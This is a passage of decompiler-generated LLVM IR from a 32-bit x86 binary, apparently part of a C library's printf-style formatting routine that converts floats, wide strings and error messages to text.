  %v2_8051a11 = inttoptr i32 %v1_8051a11 to i8*
  %v3_8051a11 = load i8, i8* %v2_8051a11, align 1
  %v4_8051a11 = and i8 %v3_8051a11, 16
  %v5_8051a11 = icmp eq i8 %v4_8051a11, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8051a11, label %dec_label_pc_8051a49, label %dec_label_pc_8051a18

dec_label_pc_8051a18:                             ; preds = %dec_label_pc_80519f7
  %v1_8051a18 = add i32 %v0_8051a59, 48
  %v2_8051a18 = inttoptr i32 %v1_8051a18 to i32*
  %v3_8051a18 = load i32, i32* %v2_8051a18, align 4
  store i32 %v3_8051a18, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp71 = icmp ult i32 %v3_8051a18, 3
  %v3_8051a21 = load i32, i32* @ebp, align 4
  %v5_8051a21 = select i1 %tmp71, i32 6, i32 %v3_8051a21
  store i32 %v5_8051a21, i32* @ebp, align 4
  %v1_8051a24 = add i32 %v3_8051a18, -3
  %v9_8051a24 = icmp eq i32 %v1_8051a24, 0
  %v10_8051a24 = icmp slt i32 %v1_8051a24, 0
  store i1 %v10_8051a24, i1* %sf.global-to-local, align 1
  %v1_8051a27 = icmp eq i1 %v9_8051a24, false
  br i1 %v1_8051a27, label %dec_label_pc_8051a30, label %dec_label_pc_8051a29

dec_label_pc_8051a29:                             ; preds = %dec_label_pc_8051a18
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051a49

dec_label_pc_8051a30:                             ; preds = %dec_label_pc_8051a18
  %v1_8051a30 = add i32 %v3_8051a18, -4
  %v9_8051a30 = icmp eq i32 %v1_8051a30, 0
  %v10_8051a30 = icmp slt i32 %v1_8051a30, 0
  store i1 %v10_8051a30, i1* %sf.global-to-local, align 1
  %v1_8051a33 = icmp eq i1 %v9_8051a30, false
  br i1 %v1_8051a33, label %dec_label_pc_8051a49, label %dec_label_pc_8051a35

dec_label_pc_8051a35:                             ; preds = %dec_label_pc_8051a30
  %v2_8051a35 = sub i32 %v3_8051a0e, %v1_8051a09
  %v7_8051a35 = icmp ult i32 %v3_8051a0e, %v1_8051a09
  %v12_8051a35 = icmp eq i32 %v2_8051a35, 0
  %v13_8051a35 = icmp slt i32 %v2_8051a35, 0
  store i1 %v13_8051a35, i1* %sf.global-to-local, align 1
  %v2_8051a37 = or i1 %v7_8051a35, %v12_8051a35
  br i1 %v2_8051a37, label %dec_label_pc_8051a39, label %dec_label_pc_8051a49

dec_label_pc_8051a39:                             ; preds = %dec_label_pc_8051a35
  %v1_8051a39 = inttoptr i32 %v0_8051a49 to i8*
  %v2_8051a39 = load i8, i8* %v1_8051a39, align 1
  %v3_8051a39 = add i8 %v2_8051a39, -48
  %v8_8051a39 = icmp eq i8 %v3_8051a39, 0
  %v9_8051a39 = icmp slt i8 %v3_8051a39, 0
  store i1 %v9_8051a39, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051a39, label %dec_label_pc_8051a49, label %dec_label_pc_8051a43

dec_label_pc_8051a43:                             ; preds = %dec_label_pc_8051a39
  %v1_8051a43 = add i32 %v2_8051a07, 128
  store i32 %v1_8051a43, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051a49

dec_label_pc_8051a49:                             ; preds = %dec_label_pc_8051a35, %dec_label_pc_8051a39, %dec_label_pc_8051a30, %dec_label_pc_80519f7, %dec_label_pc_8051a29, %dec_label_pc_8051a43
  %v0_8051a82 = phi i32 [ %v3_8051a0e, %dec_label_pc_8051a35 ], [ 1, %dec_label_pc_8051a39 ], [ %v3_8051a0e, %dec_label_pc_8051a30 ], [ %v3_8051a0e, %dec_label_pc_80519f7 ], [ %v3_8051a0e, %dec_label_pc_8051a29 ], [ %v1_8051a43, %dec_label_pc_8051a43 ]
  %v1_8051a49 = inttoptr i32 %v0_8051a49 to i8*
  %v2_8051a49 = load i8, i8* %v1_8051a49, align 1
  %v3_8051a49 = add i8 %v2_8051a49, -48
  %v8_8051a49 = icmp eq i8 %v3_8051a49, 0
  %v9_8051a49 = icmp slt i8 %v3_8051a49, 0
  store i1 %v9_8051a49, i1* %sf.global-to-local, align 1
  %v1_8051a4c = icmp eq i1 %v8_8051a49, false
  br i1 %v1_8051a4c, label %dec_label_pc_8051a7a, label %dec_label_pc_8051a4e

dec_label_pc_8051a4e:                             ; preds = %dec_label_pc_8051a49
  %v0_8051a4e = load i32, i32* @ebp, align 4
  %v1_8051a4e = add i32 %v0_8051a4e, -6
  %v6_8051a4e = sub i32 5, %v0_8051a4e
  %v7_8051a4e = and i32 %v6_8051a4e, %v0_8051a4e
  %v8_8051a4e = icmp slt i32 %v7_8051a4e, 0
  %v10_8051a4e = icmp slt i32 %v1_8051a4e, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_8051a56 = icmp eq i1 %v10_8051a4e, %v8_8051a4e
  %v5_8051a56 = select i1 %v2_8051a56, i32 11, i32 %v0_8051a4e
  store i32 %v5_8051a56, i32* @ebp, align 4
  %v1_8051a59 = add i32 %v0_8051a59, 48
  %v2_8051a59 = inttoptr i32 %v1_8051a59 to i32*
  %v3_8051a59 = load i32, i32* %v2_8051a59, align 4
  %v4_8051a59 = add i32 %v3_8051a59, -1
  %v12_8051a59 = icmp eq i32 %v4_8051a59, 0
  %v13_8051a59 = icmp slt i32 %v4_8051a59, 0
  store i1 %v13_8051a59, i1* %sf.global-to-local, align 1
  %v1_8051a5e = icmp eq i1 %v12_8051a59, false
  br i1 %v1_8051a5e, label %dec_label_pc_8051a6f, label %dec_label_pc_8051a60

dec_label_pc_8051a60:                             ; preds = %dec_label_pc_8051a4e
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8059cb8.471 to i32), i32* @edi, align 4
  br label %dec_label_pc_8051bf9

dec_label_pc_8051a6f:                             ; preds = %dec_label_pc_8051a4e
  %v1_8051a6f = icmp eq i32 %v0_8051a82, 0
  %v2_8051a6f = icmp slt i32 %v0_8051a82, 0
  store i1 %v2_8051a6f, i1* %sf.global-to-local, align 1
  %v1_8051a71 = icmp eq i1 %v1_8051a6f, false
  br i1 %v1_8051a71, label %dec_label_pc_8051a7a, label %dec_label_pc_8051a73

dec_label_pc_8051a73:                             ; preds = %dec_label_pc_8051a6f
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8051bf9

dec_label_pc_8051a7a:                             ; preds = %dec_label_pc_8051a6f, %dec_label_pc_8051a49
  %v2_8051a7a = sub i32 %v0_8051a82, %v1_8051a09
  %v7_8051a7a = icmp ult i32 %v0_8051a82, %v1_8051a09
  %v12_8051a7a = icmp eq i32 %v2_8051a7a, 0
  %v13_8051a7a = icmp slt i32 %v2_8051a7a, 0
  store i1 %v13_8051a7a, i1* %sf.global-to-local, align 1
  %v2_8051a7c = or i1 %v7_8051a7a, %v12_8051a7a
  br i1 %v2_8051a7c, label %dec_label_pc_8051bf9, label %dec_label_pc_8051a82

dec_label_pc_8051a82:                             ; preds = %dec_label_pc_8051a7a
  store i1 %v13_8051a7a, i1* %sf.global-to-local, align 1
  store i32 %v2_8051a7a, i32* @ebx, align 4
  br label %dec_label_pc_8051c13

dec_label_pc_8051a8b:                             ; preds = %dec_label_pc_805191e
  %v1_8051a8b = add i32 %v3_80518f0, -15
  %v5_8051a8b = icmp ult i32 %v3_80518f0, 15
  %v9_8051a8b = icmp eq i32 %v1_8051a8b, 0
  %v10_8051a8b = icmp slt i32 %v1_8051a8b, 0
  store i1 %v10_8051a8b, i1* %sf.global-to-local, align 1
  %v2_8051a8e = or i1 %v5_8051a8b, %v9_8051a8b
  br i1 %v2_8051a8e, label %dec_label_pc_8051a90, label %dec_label_pc_8051ad5

dec_label_pc_8051a90:                             ; preds = %dec_label_pc_8051a8b
  %v1_8051a90 = add i32 %v0_80518f0.lcssa, 33
  %v2_8051a90 = inttoptr i32 %v1_8051a90 to i8*
  %v3_8051a90 = load i8, i8* %v2_8051a90, align 1
  %v4_8051a90 = and i8 %v3_8051a90, 8
  %v5_8051a90 = icmp eq i8 %v4_8051a90, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051a95 = add i32 %v0_80518f0.lcssa, 344
  %v2_8051a95 = inttoptr i32 %v1_8051a95 to i32*
  %v3_8051a95 = load i32, i32* %v2_8051a95, align 4
  store i32 %v3_8051a95, i32* %edx.global-to-local, align 4
  br i1 %v5_8051a90, label %dec_label_pc_8051aa2, label %dec_label_pc_8051a9e

dec_label_pc_8051a9e:                             ; preds = %dec_label_pc_8051a90
  %v1_8051a9e = inttoptr i32 %v3_8051a95 to x86_fp80*
  %v2_8051a9e = load x86_fp80, x86_fp80* %v1_8051a9e, align 4
  br label %dec_label_pc_8051aa4

dec_label_pc_8051aa2:                             ; preds = %dec_label_pc_8051a90
  %v1_8051aa2 = inttoptr i32 %v3_8051a95 to double*
  %v2_8051aa2 = load double, double* %v1_8051aa2, align 4
  %v3_8051aa2 = fpext double %v2_8051aa2 to x86_fp80
  br label %dec_label_pc_8051aa4

dec_label_pc_8051aa4:                             ; preds = %dec_label_pc_8051a9e, %dec_label_pc_8051aa2
  %storemerge6 = phi x86_fp80 [ %v2_8051a9e, %dec_label_pc_8051a9e ], [ %v3_8051aa2, %dec_label_pc_8051aa2 ]
  store x86_fp80 %storemerge6, x86_fp80* %st0.global-to-local, align 4
  %v0_8051aa4 = load i32, i32* @esi, align 4
  %v2_8051aa4 = add i32 %v0_80518f0.lcssa, -4
  %v3_8051aa4 = inttoptr i32 %v2_8051aa4 to i32*
  store i32 %v0_8051aa4, i32* %v3_8051aa4, align 4
  %v0_8051aa5 = load i32, i32* @esi, align 4
  %v2_8051aa5 = add i32 %v0_80518f0.lcssa, -8
  %v3_8051aa5 = inttoptr i32 %v2_8051aa5 to i32*
  store i32 %v0_8051aa5, i32* %v3_8051aa5, align 4
  %v1_8051aa6 = add i32 %v0_80518f0.lcssa, -12
  %v2_8051aa6 = inttoptr i32 %v1_8051aa6 to i32*
  store i32 134551398, i32* %v2_8051aa6, align 4
  %v1_8051aab = add i32 %v0_80518f0.lcssa, 20
  store i32 %v1_8051aab, i32* %eax.global-to-local, align 4
  %v2_8051aaf = add i32 %v0_80518f0.lcssa, -16
  %v3_8051aaf = inttoptr i32 %v2_8051aaf to i32*
  store i32 %v1_8051aab, i32* %v3_8051aaf, align 4
  %v1_8051ab0 = add i32 %v0_80518f0.lcssa, -28
  %v10_8051ab0 = icmp slt i32 %v1_8051ab0, 0
  store i1 %v10_8051ab0, i1* %sf.global-to-local, align 1
  %v1_8051ab3 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051ab3 = inttoptr i32 %v1_8051ab0 to x86_fp80*
  store x86_fp80 %v1_8051ab3, x86_fp80* %v3_8051ab3, align 4
  %v1_8051ab6 = add i32 %v0_80518f0.lcssa, 368
  %v2_8051ab6 = inttoptr i32 %v1_8051ab6 to i32*
  %v3_8051ab6 = load i32, i32* %v2_8051ab6, align 4
  %v5_8051ab6 = add i32 %v0_80518f0.lcssa, -32
  %v6_8051ab6 = inttoptr i32 %v5_8051ab6 to i32*
  store i32 %v3_8051ab6, i32* %v6_8051ab6, align 4
  %v0_8051abd = call i32 @_fpmaxtostr()
  store i32 %v0_8051abd, i32* %eax.global-to-local, align 4
  %v0_8051ac2 = load i32, i32* @esp, align 4
  %v1_8051ac2 = add i32 %v0_8051ac2, 32
  %v2_8051ac5 = icmp slt i32 %v0_8051abd, 0
  store i1 %v2_8051ac5, i1* %sf.global-to-local, align 1
  br i1 %v2_8051ac5, label %dec_label_pc_8051d73, label %dec_label_pc_8051acd

dec_label_pc_8051acd:                             ; preds = %dec_label_pc_8051aa4
  %v1_8051acd = inttoptr i32 %v1_8051ac2 to i32*
  %v2_8051acd = load i32, i32* %v1_8051acd, align 4
  %v4_8051acd = add i32 %v2_8051acd, %v0_8051abd
  %v15_8051acd = icmp slt i32 %v4_8051acd, 0
  store i1 %v15_8051acd, i1* %sf.global-to-local, align 1
  store i32 %v4_8051acd, i32* %v1_8051acd, align 4
  %v0_8051d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051d60

dec_label_pc_8051ad5:                             ; preds = %dec_label_pc_8051a8b
  %v1_8051ad5 = add i32 %v3_80518f0, -17
  %v5_8051ad5 = icmp ult i32 %v3_80518f0, 17
  %v9_8051ad5 = icmp eq i32 %v1_8051ad5, 0
  %v10_8051ad5 = icmp slt i32 %v1_8051ad5, 0
  store i1 %v10_8051ad5, i1* %sf.global-to-local, align 1
  %v2_8051ad8 = or i1 %v5_8051ad5, %v9_8051ad5
  br i1 %v2_8051ad8, label %dec_label_pc_8051ade, label %dec_label_pc_8051b72

dec_label_pc_8051ade:                             ; preds = %dec_label_pc_8051ad5
  %v1_8051ade = add i32 %v0_80518f0.lcssa, 332
  %v2_8051ade = inttoptr i32 %v1_8051ade to i32*
  store i32 0, i32* %v2_8051ade, align 4
  %v0_8051ae9 = load i32, i32* @esp, align 4
  %v1_8051ae9 = add i32 %v0_8051ae9, 344
  %v2_8051ae9 = inttoptr i32 %v1_8051ae9 to i32*
  %v3_8051ae9 = load i32, i32* %v2_8051ae9, align 4
  store i32 %v3_8051ae9, i32* %edx.global-to-local, align 4
  %v1_8051af0 = icmp eq i1 %v9_8051ad5, false
  br i1 %v1_8051af0, label %dec_label_pc_8051b42, label %dec_label_pc_8051af2

dec_label_pc_8051af2:                             ; preds = %dec_label_pc_8051ade
  %v1_8051af2 = inttoptr i32 %v3_8051ae9 to i32*
  %v2_8051af2 = load i32, i32* %v1_8051af2, align 4
  store i32 %v2_8051af2, i32* %eax.global-to-local, align 4
  %v1_8051af4 = icmp eq i32 %v2_8051af2, 0
  %v2_8051af4 = icmp slt i32 %v2_8051af2, 0
  store i1 %v2_8051af4, i1* %sf.global-to-local, align 1
  %v2_8051af6 = add i32 %v0_8051ae9, 340
  %v3_8051af6 = inttoptr i32 %v2_8051af6 to i32*
  store i32 %v2_8051af2, i32* %v3_8051af6, align 4
  br i1 %v1_8051af4, label %dec_label_pc_8051bfd, label %dec_label_pc_8051b03

dec_label_pc_8051b03:                             ; preds = %dec_label_pc_8051af2
  %v0_8051b03 = load i32, i32* @esp, align 4
  %v1_8051b03 = add i32 %v0_8051b03, 20
  %v2_8051b03 = inttoptr i32 %v1_8051b03 to i32*
  %v3_8051b03 = load i32, i32* %v2_8051b03, align 4
  %v1_8051b0a = add i32 %v0_8051b03, 340
  store i32 %v1_8051b0a, i32* %ecx.global-to-local, align 4
  %v2_8051b11 = icmp slt i32 %v3_8051b03, 0
  store i1 %v2_8051b11, i1* %sf.global-to-local, align 1
  %v1_8051b13 = icmp eq i1 %v2_8051b11, false
  %v4_8051b13 = select i1 %v1_8051b13, i32 %v3_8051b03, i32 -1
  store i32 %v4_8051b13, i32* %edx.global-to-local, align 4
  %v1_8051b16 = add i32 %v0_8051b03, 332
  store i32 %v1_8051b16, i32* %eax.global-to-local, align 4
  %v2_8051b1d = add i32 %v0_8051b03, -4
  %v3_8051b1d = inttoptr i32 %v2_8051b1d to i32*
  store i32 %v1_8051b16, i32* %v3_8051b1d, align 4
  %v0_8051b1e = load i32, i32* %edx.global-to-local, align 4
  %v2_8051b1e = add i32 %v0_8051b03, -8
  %v3_8051b1e = inttoptr i32 %v2_8051b1e to i32*
  store i32 %v0_8051b1e, i32* %v3_8051b1e, align 4
  %v0_8051b1f = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051b1f = add i32 %v0_8051b03, -12
  %v3_8051b1f = inttoptr i32 %v2_8051b1f to i32*
  store i32 %v0_8051b1f, i32* %v3_8051b1f, align 4
  %v0_8051b20 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051b20 = add i32 %v0_8051b03, -16
  %v3_8051b20 = inttoptr i32 %v2_8051b20 to i32*
  store i32 %v0_8051b20, i32* %v3_8051b20, align 4
  %v0_8051b21 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8051b21, i32* %eax.global-to-local, align 4
  %v0_8051b26 = load i32, i32* @esp, align 4
  %v1_8051b26 = add i32 %v0_8051b26, 16
  %v1_8051b29 = add i32 %v0_8051b21, 1
  %v10_8051b29 = icmp eq i32 %v1_8051b29, 0
  %v11_8051b29 = icmp slt i32 %v1_8051b29, 0
  store i1 %v11_8051b29, i1* %sf.global-to-local, align 1
  store i32 %v0_8051b21, i32* @esi, align 4
  br i1 %v10_8051b29, label %dec_label_pc_8051d73, label %dec_label_pc_8051b34

dec_label_pc_8051b34:                             ; preds = %dec_label_pc_8051b03
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051c0e

dec_label_pc_8051b42:                             ; preds = %dec_label_pc_8051ade
  %v0_8051b42 = load i32, i32* @ebx, align 4
  %v2_8051b42 = add i32 %v0_8051ae9, -4
  %v3_8051b42 = inttoptr i32 %v2_8051b42 to i32*
  store i32 %v0_8051b42, i32* %v3_8051b42, align 4
  %v1_8051b43 = add i32 %v0_8051ae9, 332
  store i32 %v1_8051b43, i32* %eax.global-to-local, align 4
  %v2_8051b4a = add i32 %v0_8051ae9, -8
  %v3_8051b4a = inttoptr i32 %v2_8051b4a to i32*
  store i32 %v1_8051b43, i32* %v3_8051b4a, align 4
  %v0_8051b4b = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b4b = inttoptr i32 %v0_8051b4b to i32*
  %v2_8051b4b = load i32, i32* %v1_8051b4b, align 4
  %v4_8051b4b = add i32 %v0_8051ae9, -12
  %v5_8051b4b = inttoptr i32 %v4_8051b4b to i32*
  store i32 %v2_8051b4b, i32* %v5_8051b4b, align 4
  %v1_8051b4d = add i32 %v0_8051ae9, 204
  store i32 %v1_8051b4d, i32* @edi, align 4
  %v2_8051b54 = add i32 %v0_8051ae9, -16
  %v3_8051b54 = inttoptr i32 %v2_8051b54 to i32*
  store i32 %v1_8051b4d, i32* %v3_8051b54, align 4
  %v0_8051b55 = call i32 @__GI_wcrtomb()
  store i32 %v0_8051b55, i32* %eax.global-to-local, align 4
  %v0_8051b5a = load i32, i32* @esp, align 4
  %v1_8051b5a = add i32 %v0_8051b5a, 16
  %v1_8051b5d = add i32 %v0_8051b55, 1
  %v10_8051b5d = icmp eq i32 %v1_8051b5d, 0
  %v11_8051b5d = icmp slt i32 %v1_8051b5d, 0
  store i1 %v11_8051b5d, i1* %sf.global-to-local, align 1
  store i32 %v0_8051b55, i32* @esi, align 4
  br i1 %v10_8051b5d, label %dec_label_pc_8051d73, label %dec_label_pc_8051b68

dec_label_pc_8051b68:                             ; preds = %dec_label_pc_8051b42
  %v2_8051b68 = add i32 %v0_8051b55, 220
  %v3_8051b68 = add i32 %v2_8051b68, %v0_8051b5a
  %v4_8051b68 = inttoptr i32 %v3_8051b68 to i8*
  store i8 0, i8* %v4_8051b68, align 1
  br label %dec_label_pc_8051ba0

dec_label_pc_8051b72:                             ; preds = %dec_label_pc_8051ad5
  %v1_8051b72 = add i32 %v3_80518f0, -19
  %v5_8051b72 = icmp ult i32 %v3_80518f0, 19
  %v9_8051b72 = icmp eq i32 %v1_8051b72, 0
  %v10_8051b72 = icmp slt i32 %v1_8051b72, 0
  store i1 %v10_8051b72, i1* %sf.global-to-local, align 1
  %v2_8051b75 = or i1 %v5_8051b72, %v9_8051b72
  br i1 %v2_8051b75, label %dec_label_pc_8051b77, label %dec_label_pc_8051bcf

dec_label_pc_8051b77:                             ; preds = %dec_label_pc_8051b72
  %v1_8051b77 = add i32 %v0_80518f0.lcssa, 344
  %v2_8051b77 = inttoptr i32 %v1_8051b77 to i32*
  %v3_8051b77 = load i32, i32* %v2_8051b77, align 4
  store i32 %v3_8051b77, i32* %edx.global-to-local, align 4
  %v1_8051b7e = icmp eq i1 %v9_8051b72, false
  %v1_8051ba9 = inttoptr i32 %v3_8051b77 to i32*
  %v2_8051ba9 = load i32, i32* %v1_8051ba9, align 4
  br i1 %v1_8051b7e, label %dec_label_pc_8051ba9, label %dec_label_pc_8051b80

dec_label_pc_8051b80:                             ; preds = %dec_label_pc_8051b77
  store i32 %v2_8051ba9, i32* @edi, align 4
  %v1_8051b82 = icmp eq i32 %v2_8051ba9, 0
  %v2_8051b82 = icmp slt i32 %v2_8051ba9, 0
  store i1 %v2_8051b82, i1* %sf.global-to-local, align 1
  br i1 %v1_8051b82, label %dec_label_pc_8051bfd, label %dec_label_pc_8051b86

dec_label_pc_8051b86:                             ; preds = %dec_label_pc_8051b80, %dec_label_pc_8051bd8
  %v1_8051b8d = phi i32 [ %v0_80518f0.lcssa, %dec_label_pc_8051b80 ], [ %v1_8051bf2, %dec_label_pc_8051bd8 ]
  %v1_8051b86 = add i32 %v1_8051b8d, 20
  %v2_8051b86 = inttoptr i32 %v1_8051b86 to i32*
  %v3_8051b86 = load i32, i32* %v2_8051b86, align 4
  store i32 %v3_8051b86, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_8051b8d = add i32 %v1_8051b8d, -4
  %v3_8051b8d = inttoptr i32 %v2_8051b8d to i32*
  store i32 %v3_80518f0, i32* %v3_8051b8d, align 4
  %v2_8051b8e = add i32 %v1_8051b8d, -8
  %v3_8051b8e = inttoptr i32 %v2_8051b8e to i32*
  store i32 %v3_80518f0, i32* %v3_8051b8e, align 4
  %v2_8051b8f = icmp slt i32 %v3_8051b86, 0
  store i1 %v2_8051b8f, i1* %sf.global-to-local, align 1
  %v1_8051b91 = icmp eq i1 %v2_8051b8f, false
  %v2_8051b91 = load i32, i32* %eax.global-to-local, align 4
  %v4_8051b91 = select i1 %v1_8051b91, i32 %v3_8051b86, i32 %v2_8051b91
  store i32 %v4_8051b91, i32* %eax.global-to-local, align 4
  %v2_8051b94 = add i32 %v1_8051b8d, -12
  %v3_8051b94 = inttoptr i32 %v2_8051b94 to i32*
  store i32 %v4_8051b91, i32* %v3_8051b94, align 4
  %v0_8051b95 = load i32, i32* @edi, align 4
  %v2_8051b95 = add i32 %v1_8051b8d, -16
  %v3_8051b95 = inttoptr i32 %v2_8051b95 to i32*
  store i32 %v0_8051b95, i32* %v3_8051b95, align 4
  %v0_8051b96 = call i32 @strnlen()
  store i32 %v0_8051b96, i32* %eax.global-to-local, align 4
  %v0_8051b9b = load i32, i32* @esp, align 4
  %v1_8051b9b = add i32 %v0_8051b9b, 16
  %v7_8051b9b = icmp slt i32 %v1_8051b9b, 0
  store i1 %v7_8051b9b, i1* %sf.global-to-local, align 1
  store i32 %v0_8051b96, i32* @esi, align 4
  br label %dec_label_pc_8051ba0

dec_label_pc_8051ba0:                             ; preds = %dec_label_pc_8051b68, %dec_label_pc_8051b86
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8051c0e

dec_label_pc_8051ba9:                             ; preds = %dec_label_pc_8051b77
  store i32 %v2_8051ba9, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_8051bb7 = add i32 %v0_80518f0.lcssa, 204
  store i32 %v1_8051bb7, i32* @edi, align 4
  %v1_8051bbe = add i32 %v0_80518f0.lcssa, 205
  %v2_8051bbe = inttoptr i32 %v1_8051bbe to i8*
  store i8 0, i8* %v2_8051bbe, align 1
  %v0_8051bc6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bc6 = trunc i32 %v0_8051bc6 to i8
  %v2_8051bc6 = load i32, i32* @esp, align 4
  %v3_8051bc6 = add i32 %v2_8051bc6, 204
  %v4_8051bc6 = inttoptr i32 %v3_8051bc6 to i8*
  store i8 %v1_8051bc6, i8* %v4_8051bc6, align 1
  br label %dec_label_pc_8051c0e

dec_label_pc_8051bcf:                             ; preds = %dec_label_pc_8051b72
  %v1_8051bcf = add i32 %v3_80518f0, -20
  %v9_8051bcf = icmp eq i32 %v1_8051bcf, 0
  %v10_8051bcf = icmp slt i32 %v1_8051bcf, 0
  store i1 %v10_8051bcf, i1* %sf.global-to-local, align 1
  %v1_8051bd2 = icmp eq i1 %v9_8051bcf, false
  br i1 %v1_8051bd2, label %dec_label_pc_8051d73, label %dec_label_pc_8051bd8

dec_label_pc_8051bd8:                             ; preds = %dec_label_pc_8051bcf
  %v0_8051bd8 = load i32, i32* %stack_var_-364, align 4
  %v1_8051bd8 = call i32 @__errno_location(i32 %v0_8051bd8)
  store i32 %v1_8051bd8, i32* %eax.global-to-local, align 4
  %v0_8051bdd = load i32, i32* %edx.global-to-local, align 4
  %v1_8051bdd = load i32, i32* @esp, align 4
  %v2_8051bdd = add i32 %v1_8051bdd, -4
  %v3_8051bdd = inttoptr i32 %v2_8051bdd to i32*
  store i32 %v0_8051bdd, i32* %v3_8051bdd, align 4
  %v1_8051bde = add i32 %v1_8051bdd, -8
  %v2_8051bde = inttoptr i32 %v1_8051bde to i32*
  store i32 128, i32* %v2_8051bde, align 4
  %v1_8051be3 = add i32 %v1_8051bdd, 204
  store i32 %v1_8051be3, i32* %edx.global-to-local, align 4
  %v2_8051bea = add i32 %v1_8051bdd, -12
  %v3_8051bea = inttoptr i32 %v2_8051bea to i32*
  store i32 %v1_8051be3, i32* %v3_8051bea, align 4
  %v1_8051beb = inttoptr i32 %v1_8051bd8 to i32*
  %v2_8051beb = load i32, i32* %v1_8051beb, align 4
  %v4_8051beb = add i32 %v1_8051bdd, -16
  %v5_8051beb = inttoptr i32 %v4_8051beb to i32*
  store i32 %v2_8051beb, i32* %v5_8051beb, align 4
  %v0_8051bed = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8051bed, i32* %eax.global-to-local, align 4
  %v0_8051bf2 = load i32, i32* @esp, align 4
  %v1_8051bf2 = add i32 %v0_8051bf2, 16
  %v7_8051bf2 = icmp slt i32 %v1_8051bf2, 0
  store i1 %v7_8051bf2, i1* %sf.global-to-local, align 1
  store i32 %v0_8051bed, i32* @edi, align 4
  br label %dec_label_pc_8051b86

dec_label_pc_8051bf9:                             ; preds = %dec_label_pc_8051a7a, %dec_label_pc_8051a73, %dec_label_pc_8051a60
  %v0_8051c1636 = phi i32 [ %v1_8051a09, %dec_label_pc_8051a7a ], [ 0, %dec_label_pc_8051a73 ], [ 5, %dec_label_pc_8051a60 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051c13

dec_label_pc_8051bfd:                             ; preds = %dec_label_pc_8051b80, %dec_label_pc_8051af2
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8059cbe.472 to i32), i32* @edi, align 4
  br label %dec_label_pc_8051c0e

dec_label_pc_8051c0e:                             ; preds = %dec_label_pc_8051ba9, %dec_label_pc_8051ba0, %dec_label_pc_8051b34, %dec_label_pc_8051bfd
  %v0_8051c0e = load i32, i32* @esp, align 4
  %v1_8051c0e = add i32 %v0_8051c0e, 7
  %v2_8051c0e = inttoptr i32 %v1_8051c0e to i8*
  store i8 32, i8* %v2_8051c0e, align 1
  %v0_8051c16.pre = load i32, i32* @esi, align 4
  %v1_8051c16.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051c13

dec_label_pc_8051c13:                             ; preds = %dec_label_pc_8051bf9, %dec_label_pc_8051a82, %dec_label_pc_8051c0e
  %v1_8051c16 = phi i32 [ 0, %dec_label_pc_8051bf9 ], [ %v2_8051a7a, %dec_label_pc_8051a82 ], [ %v1_8051c16.pre, %dec_label_pc_8051c0e ]
  %v0_8051c16 = phi i32 [ %v0_8051c1636, %dec_label_pc_8051bf9 ], [ %v1_8051a09, %dec_label_pc_8051a82 ], [ %v0_8051c16.pre, %dec_label_pc_8051c0e ]
  %v0_8051c13 = load i32, i32* @ebp, align 4
  %v1_8051c13 = add i32 %v0_8051c13, -11
  %v9_8051c13 = icmp eq i32 %v1_8051c13, 0
  %v10_8051c13 = icmp slt i32 %v1_8051c13, 0
  store i1 %v10_8051c13, i1* %sf.global-to-local, align 1
  %v2_8051c16 = add i32 %v0_8051c16, %v1_8051c16
  store i32 %v2_8051c16, i32* @edx, align 4
  br i1 %v9_8051c13, label %dec_label_pc_8051c27, label %dec_label_pc_8051c1b

dec_label_pc_8051c1b:                             ; preds = %dec_label_pc_8051c13
  %v1_8051c1d = add i32 %v0_8051c13, -5
  %v6_8051c1d = sub i32 4, %v0_8051c13
  %v7_8051c1d = and i32 %v6_8051c1d, %v0_8051c13
  %v8_8051c1d = icmp slt i32 %v7_8051c1d, 0
  %v9_8051c1d = icmp eq i32 %v1_8051c1d, 0
  %v10_8051c1d = icmp slt i32 %v1_8051c1d, 0
  store i1 %v10_8051c1d, i1* %sf.global-to-local, align 1
  %v3_8051c20 = icmp eq i1 %v10_8051c1d, %v8_8051c1d
  %v4_8051c20 = icmp eq i1 %v9_8051c1d, false
  %v5_8051c20 = and i1 %v4_8051c20, %v3_8051c20
  %v6_8051c20 = zext i1 %v5_8051c20 to i32
  store i32 %v6_8051c20, i32* %eax.global-to-local, align 4
  %v2_8051c23 = add i32 %v2_8051c16, 1
  %v3_8051c23 = add i32 %v2_8051c23, %v6_8051c20
  store i32 %v3_8051c23, i32* @edx, align 4
  br label %dec_label_pc_8051c27

dec_label_pc_8051c27:                             ; preds = %dec_label_pc_8051c13, %dec_label_pc_8051c1b
  %v0_8051c27 = load i32, i32* @esp, align 4
